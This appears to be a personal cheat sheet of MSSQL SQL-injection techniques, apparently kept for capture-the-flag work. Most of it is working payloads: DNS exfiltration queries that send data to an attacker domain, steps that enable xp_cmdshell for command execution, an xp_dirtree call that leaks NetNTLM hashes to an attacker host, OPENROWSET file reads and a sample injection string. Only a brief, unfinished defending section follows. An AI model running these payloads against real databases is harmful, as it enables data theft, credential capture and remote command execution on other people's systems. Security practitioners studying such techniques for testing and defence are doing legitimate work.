# SQL injection

## Out-of-band DNS
### MSSQL
|SQL function|SQL query|
|--|--|
|`master..xp_dirtree`|`DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`master..xp_fileexist`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`master..xp_subdirs`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`sys.dm_os_file_exists`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');`|
|`fn_trace_gettable`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);`|
|`fn_get_audit_file`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`|
> **Note:** Notice how in all of the above payloads we start by declaring `@T` as `VARCHAR` then add our query within it, and then we add it to the domain. This will become handy later on when we want to split `@T` into multiple strings so it fits as a sub-domain. It is also useful to ensure whatever result we get is a string, otherwise it may break our query.

#### Splitting result
`DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), <flag>), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`

## RCE
### MSSQL
|Request|Command|
|--|--|
|Check permission|`IS_SRVROLEMEMBER('sysadmin');`|
|Enabling advanced options|`EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;`|
|Enabling xp_cmdshell|`EXEC sp_configure 'xp_cmdshell', '1';RECONFIGURE;`|
|ping \<host\>|`EXEC xp_cmdshell 'ping /n 4 <host>';`|

## Leaking NetNTLM Hashes (MSSQL)
1. Run [responder](https://github.com/lgandx/Responder).
2. Get NTLM hash: `EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1`

## File Read
### MSSQL
If we have the correct permissions, we can read files via an (MS)SQL injection. To do so we can use the [OPENROWSET](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver16) function with a **bulk** operation.

#### Syntax
The syntax looks like this. **SINGLE_CLOB** means the input will be stored as a **varchar**, other options are **SINGLE_BLOB** which stores data as **varbinary**, and **SINGLE_NCLOB** which uses **nvarchar**.


```sql
-- Get the length of a file
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x

-- Get the contents of a file
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```

#### Checking permissions
```sql
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';
```

##### Exploitation (example)
```sql
maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS')>0;--
```

## Defending
### MSSQL
1. Don't Run Queries as Sysadmin!

> First and foremost, don't use **sa** to run your queries.

2. Disable Dangerous Functions